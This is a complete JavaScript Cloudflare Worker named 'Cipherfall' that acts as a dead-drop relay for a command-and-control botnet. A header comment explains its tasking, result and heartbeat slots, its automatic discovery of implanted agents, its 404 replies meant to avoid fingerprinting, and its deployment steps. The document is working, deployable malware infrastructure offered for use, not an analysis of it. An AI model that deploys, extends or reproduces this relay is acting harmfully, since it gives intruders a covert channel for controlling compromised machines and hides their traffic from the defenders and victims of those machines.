/*
 * worker.js — Cipherfall Cloudflare Worker (dead-drop relay)
 *
 * Role:
 *   Acts as a passive data mule between the C2 server and the agents.
 *   Neither endpoint ever connects to the other; all data transits through
 *   this Worker's KV store. The Worker itself never decrypts anything —
 *   it stores and returns opaque base64 blobs encrypted by the endpoints.
 *
 * KV slots:
 *   task:{agent_id}   — encrypted task written by server, read once by agent
 *   result:{task_id}  — encrypted result written by agent, read by server
 *   hb:{agent_id}     — encrypted heartbeat written by agent, read by server
 *
 * TTL policy:
 *   task   : 1 h   (stale if agent never checks in)
 *   result : 24 h  (server has a day to poll for it)
 *   hb     : 10 min (refreshed on every agent iteration)
 *
 * One-time read:
 *   GET /task/{agent_id} deletes the KV entry after the first successful read
 *   via ctx.waitUntil so the delete does not block the response. If the agent
 *   crashes after reading but before sending a result, the task is lost and
 *   must be re-queued by the operator.
 *
 * Agent discovery:
 *   GET /agents lists all agent IDs that have an active hb: key in KV.
 *   The server uses this to auto-register new agents on their first heartbeat,
 *   removing the need for manual operator registration.
 *
 * Authentication:
 *   All requests must carry  Authorization: Bearer <WORKER_SECRET>.
 *   WORKER_SECRET is a Cloudflare secret set via:
 *     wrangler secret put WORKER_SECRET
 *   Both server and agent derive the same value from the shared PSK:
 *     HMAC-SHA256(PSK, "worker_token")[:32 hex chars]
 *   Any unauthenticated request returns 404 to avoid fingerprinting.
 *
 * Deployment:
 *   1. wrangler kv:namespace create "C2_KV"  → copy the returned id into wrangler.toml
 *   2. wrangler secret put WORKER_SECRET      → paste the derived token
 *   3. wrangler deploy
 *
 * Limitations:
 *   - KV is eventually consistent; in practice propagation is <100 ms globally.
 *   - Only one pending task per agent at a time (later PUT overwrites earlier).
 *   - No task delivery confirmation; fire-and-forget from the server's view.
 *   - GET /agents returns at most 1000 keys (Cloudflare KV list limit).
 */

export default {
  async fetch(request, env, ctx) {
    const auth = request.headers.get("Authorization") ?? "";
    if (auth !== `Bearer ${env.WORKER_SECRET}`) {
      return new Response(null, { status: 404 });
    }

    const url   = new URL(request.url);
    const parts = url.pathname.replace(/^\/+/, "").split("/").filter(p => p.length > 0);

    // Agent discovery — GET /agents
    if (parts.length === 1 && parts[0] === "agents" && request.method === "GET") {
      const list = await env.KV.list({ prefix: "hb:" });
      const ids  = list.keys.map(k => k.name.slice(3));
      return new Response(JSON.stringify(ids), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }

    if (parts.length !== 2) {
      return new Response(null, { status: 404 });
    }

    const [resource, id] = parts;
    const TTL = { task: 3600, result: 86400, hb: 600 };
    if (!(resource in TTL)) {
      return new Response(null, { status: 404 });
    }

    const key = `${resource}:${id}`;

    if (request.method === "PUT") {
      const body = await request.text();
      if (!body) return new Response(null, { status: 400 });
      await env.KV.put(key, body, { expirationTtl: TTL[resource] });
      return new Response(null, { status: 200 });
    }

    if (request.method === "GET") {
      const value = await env.KV.get(key);
      if (value === null) {
        return new Response(null, { status: 204 });
      }
      if (resource === "task") {
        ctx.waitUntil(env.KV.delete(key));
      }
      return new Response(value, {
        status: 200,
        headers: { "Content-Type": "text/plain; charset=utf-8" },
      });
    }

    return new Response(null, { status: 405 });
  },
};
